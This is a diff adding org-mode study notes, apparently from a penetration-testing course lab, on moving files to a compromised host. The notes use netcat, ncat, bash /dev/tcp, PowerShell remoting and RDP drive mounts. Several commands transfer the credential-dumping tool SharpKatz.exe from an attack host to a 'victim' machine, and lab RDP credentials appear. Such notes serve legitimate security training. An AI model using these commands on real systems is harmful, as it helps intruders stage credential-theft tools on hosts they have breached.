@@ -1,0 +1,88 @@
+:PROPERTIES:
+:ID:       1db46458-aa49-4a79-98d1-45292611af7a
+:END:
+#+title: misc file transfers
+#+OPTIONS toc:2
+
+* TOC :toc:
+- [[#netcat][Netcat]]
+- [[#ft-c-nc--ncat][FT c ~nc~ && ~ncat~]]
+  - [[#netcat-1][netcat]]
+  - [[#ncat][ncat]]
+  - [[#compromised-machine][Compromised machine]]
+  - [[#if-no-ncncat][if no nc/ncat]]
+- [[#powershell-ft][Powershell FT]]
+  - [[#powershell-remoting][Powershell remoting]]
+- [[#rdp][RDP]]
+  - [[#mounting][Mounting]]
+  - [[#host-win][host win]]
+
+* Netcat
++ r/w using =TCP/UDP=
+
+* FT c ~nc~ && ~ncat~
++ start ~nc~ on compromised machine (listen c ~-l~, port ~-p 8000~)
+** netcat
+#+begin_src bash
+    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+#+end_src
+- ~-q 0~ closes connection once file transfer is complete (=nc=)
+*** Attack host
+~nc -q 0 192.168.49.128 8000 < SharpKatz.exe~
+*** send file as input
+~sudo nc -l -p 443 -q 0 < SharpKatz.exe~
+** ncat
+#+begin_src bash
+victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+#+end_src
+- ~--recv-only~ closes connection once file transfer is complete (=ncat=)
+*** Attack host
+~ncat --send-only 192.168.49.128 8000 < SharpKatz.exe~
+*** send file as input
+~nc 192.168.49.128 443 > SharpKatz.exe~
+** Compromised machine
+#+begin_src bash
+victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+#+end_src
+#+begin_src bash
+victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+#+end_src
+
+** if no nc/ncat
+- bash supports r/w on =/dev/TCP/=
+~cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe~
+
+* Powershell FT
+** Powershell remoting
+= =WinRM=
+- exec scripts on remote computer using PS sessions
+- creates =HTTP= (TCP/5985) && =HTTPS= (TCP/5986) listener
+- need admin access / member of =Remote Mgmt Users= have explicit permissions for remoting
+*** Confirm 5985 is open
+#+begin_src powershell
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+#+end_src>
+* RDP
+- =xfreedp= / =rdesktop= -> linux
+# allow copy from target to RDP
+# can mount local resource on target RDP server.
+# can be used to expose local folder in remote RDP session
+** Mounting 
+*** rdesktop
+#+begin_src bash
+biscuitrescue@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+#+end_src
+*** xfreerdp
+#+begin_src bash
+biscuitrescue@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+#+end_src
+** host win
+- use =\\tsclient\\=
+- use =mstsc.exe=
